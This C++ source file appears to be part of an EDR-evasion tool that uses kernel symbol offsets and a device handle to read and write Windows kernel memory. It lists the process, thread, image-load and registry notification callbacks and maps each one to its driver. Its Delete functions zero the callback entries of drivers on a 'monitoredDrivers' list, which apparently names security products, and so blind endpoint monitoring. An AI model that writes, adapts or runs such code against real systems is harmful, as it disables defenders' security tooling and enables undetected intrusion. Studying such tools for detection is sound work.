#include "utils.h"



extern EZPDB pdb;
extern ULONG_PTR ntoskrnlBase;
extern const char* monitoredDrivers[];

EZPDB loadKernelOffsets() {
    std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
    std::string pdbPath = EzPdbDownload(kernel);

    if (pdbPath.empty())
    {
        std::cout << "download pdb failed " << GetLastError() << std::endl;;
    }

    EZPDB pdb;
    if (!EzPdbLoad(pdbPath, &pdb))
    {
        std::cout << "load pdb failed " << GetLastError() << std::endl;
    }


    return pdb;
}


ULONG_PTR GetKernelBaseAddress() {
	ULONG_PTR pKernelBaseAddress = 0;
	LPVOID* lpImageBase = NULL;
	DWORD dwBytesNeeded = 0;

	// first call calculates the exact size needed to read all the data
	if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
		wprintf(L"[-] Couldn't EnumDeviceDrivers.\n");
		return pKernelBaseAddress;
	}

	// allocate enough memory to read all data from EnumDeviceDrivers
	if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
		wprintf(L"[-] Couldn't allocate heap for lpImageBase.\n");
		if (lpImageBase)
			HeapFree(GetProcessHeap(), 0, lpImageBase);

		return pKernelBaseAddress;
	}

	if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
		wprintf(L"[-] Couldn't EnumDeviceDrivers.\n");
		if (lpImageBase)
			HeapFree(GetProcessHeap(), 0, lpImageBase);

		return pKernelBaseAddress;
	}

	// the first entry in the list is the kernel
	pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
	wprintf(L"[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

	return pKernelBaseAddress;
}

VOID SearchModule(ULONG64 Address, ModulesData* module) {
	ULONG_PTR pKernelBaseAddress = 0;
	LPVOID drivers[1024];
	DWORD dwBytesNeeded = 0;

	dwBytesNeeded = 1024 * 8;
	int nDrivers = 0;



	if (!EnumDeviceDrivers(drivers, dwBytesNeeded, &dwBytesNeeded)) {
		wprintf(L"[-] Couldn't EnumDeviceDrivers.\n");
		return;
	}

	nDrivers = sizeof(drivers) / sizeof(drivers[0]);

	printf("Num of loaded drivers: %d\n", nDrivers);
	LPVOID temp = NULL;

	CHAR driverName[MAX_PATH];
	//ricorda che array driver contiene i base address
	//for (size_t i = 0; i < nDrivers; i++) {
	//	if (GetDeviceDriverBaseNameA(drivers[i], driverName, sizeof(driverName)) {
	//		//check per primo byte, se inizia per 0xff e' un kernel addr probabilmente giusto per i kernel-mode drivers
	//		BYTE firstByte = (DWORD64)(drivers[i] >> 56);

	//		if (firstByte == 0xff) {
	// 
	// bubble sortiamo
	for (size_t j = 0; j < nDrivers; j++) {
		for (size_t m = j + 1; m < nDrivers; m++) {
			if (drivers[j] > drivers[m]) {
				temp = drivers[j];
				drivers[j] = drivers[m];
				drivers[m] = temp;

			}
		}
	}
	
	for (size_t i = 0; i < nDrivers-1; i++) {
		if ((ULONG64)drivers[i] <= Address && (ULONG64)drivers[i + 1] > Address) {
			if (GetDeviceDriverBaseNameA(drivers[i], driverName, sizeof(driverName))) {
				printf("Found %s  at  %llx\n", driverName, drivers[i]);

				module->moduleBase = (ULONG64)drivers[i];
				strcpy(module->moduleName, driverName);
				return;
			}
			else {
				printf("GetDeviceDriverBaseNameA failed with error: [%u]\n", GetLastError());
			}
		}

	}

	return;
}


//		CALLBACK LIST FUNCTIONS

VOID ListProcCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 pspCreateProcessNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateProcessNotifyRoutine");

	DWORD64 address = (DWORD64)ntoskrnlBase + pspCreateProcessNotifyRoutineArray;

	printf("PspCreateProcessNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };
	
	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);
		
	}


}

VOID ListThreadCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspCreateThreadNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateThreadNotifyRoutine");

	DWORD64 address = (DWORD64)ntoskrnlBase + PspCreateThreadNotifyRoutineArray;

	printf("PspCreateThreadNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}


}

VOID ListLoadImageCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspLoadImageNotifyRoutineArray = EzPdbGetRva(&pdb, "PspLoadImageNotifyRoutine");

	DWORD64 address = (DWORD64)ntoskrnlBase + PspLoadImageNotifyRoutineArray;

	printf("PspLoadImageNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}

}

VOID ListRegCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 CallbackListHead = EzPdbGetRva(&pdb, "CallbackListHead");

	DWORD64 listHead = (DWORD64)ntoskrnlBase + CallbackListHead;

	printf("CallBackListHead at address: %llx\n", listHead);
	printf("Press any key to continue\n");
	getchar();
	ModulesData moduleInfo = { 0 };
	DWORD64 moduleFuncAddr;

	DWORD64 currListEntry = listHead;
	BYTE* entry = (BYTE*)malloc(sizeof(REGISTRY_CALLBACK_ITEM));
	REGISTRY_CALLBACK_ITEM* castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;

	int i = 0;
	for (size_t i = 0; i < max_entries; i ++){
		// moduleFuncAddr = Read64(hDevice, curr)
		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;

		currListEntry = (DWORD64)castedEntry->Item.Flink;

		
		//printf("currListEntry: flink  0x%llx\n", castedEntry->Item.Flink);
		//printf("currListEntry: blink  0x%llx\n", castedEntry->Item.Blink);
		//printf("currListEntry: Context  0x%llx\n", castedEntry->Context);
		//printf("currListEntry: Function  0x%llx\n", castedEntry->Function);
		if ((DWORD64)castedEntry->Item.Flink == listHead) {
			break;
		}
		if (castedEntry->Function) {
			moduleFuncAddr = castedEntry->Function;
		}
		else if (castedEntry->Context) {
			moduleFuncAddr = castedEntry->Context;
		}
		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
		SearchModule(moduleFuncAddr, &moduleInfo);

		if (moduleInfo.moduleBase) {
			printf("Found reg callback by: %s\n", moduleInfo.moduleName);
		}
		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;
	}
	free(entry);


}

//		CALLBACK DELETING FUNCTIONS

VOID DeleteProcCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 pspCreateProcessNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateProcessNotifyRoutine");

	pspCreateProcessNotifyRoutineArray = (DWORD64)ntoskrnlBase + pspCreateProcessNotifyRoutineArray;

	DWORD64 address = pspCreateProcessNotifyRoutineArray;

	printf("pspCreateProcessNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		for (size_t j = 0; j < 104; j++) {
			if (_strcmpi((const char*)moduleInfo.moduleName,monitoredDrivers[j]) == 0) {
				printf("Deleting proc creation callback for: %s\n", moduleInfo.moduleName);
				DWORD64 callBackEntry = pspCreateProcessNotifyRoutineArray + i * 8;

				printf("callbackEntry address: %llx\n", callBackEntry);
				printf("To confirm press Any key\n");
				getchar();

				Write64(hDevice, callBackEntry, (DWORD64)0x0);
				

			}
		}

		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}

}

VOID DeleteThreadCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspCreateThreadNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateThreadNotifyRoutine");

	PspCreateThreadNotifyRoutineArray = (DWORD64)ntoskrnlBase + PspCreateThreadNotifyRoutineArray;

	DWORD64 address = PspCreateThreadNotifyRoutineArray;

	printf("PspCreateThreadNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		for (size_t j = 0; j < 104; j++) {
			if (_strcmpi((const char*)moduleInfo.moduleName, monitoredDrivers[j]) == 0) {
				printf("Deleting thread creation callback for: %s\n", moduleInfo.moduleName);
				DWORD64 callBackEntry = PspCreateThreadNotifyRoutineArray + i * 8;

				printf("callbackEntry address: %llx\n", callBackEntry);
				printf("To confirm press Any key\n");
				getchar();

				Write64(hDevice, callBackEntry, (DWORD64)0x0);


			}
		}

		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}

}

VOID DeleteLoadImageCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspLoadImageNotifyRoutineArray = EzPdbGetRva(&pdb, "PspLoadImageNotifyRoutine");

	PspLoadImageNotifyRoutineArray = (DWORD64)ntoskrnlBase + PspLoadImageNotifyRoutineArray;

	DWORD64 address = PspLoadImageNotifyRoutineArray;

	printf("PspLoadImageNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		for (size_t j = 0; j < 104; j++) {
			if (_strcmpi((const char*)moduleInfo.moduleName, monitoredDrivers[j]) == 0) {
				printf("Deleting image loading creation callback for: %s\n", moduleInfo.moduleName);
				DWORD64 callBackEntry = PspLoadImageNotifyRoutineArray + i * 8;

				printf("callbackEntry address: %llx\n", callBackEntry);
				printf("To confirm press Any key\n");
				getchar();

				Write64(hDevice, callBackEntry, (DWORD64)0x0);


			}
		}

		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}
}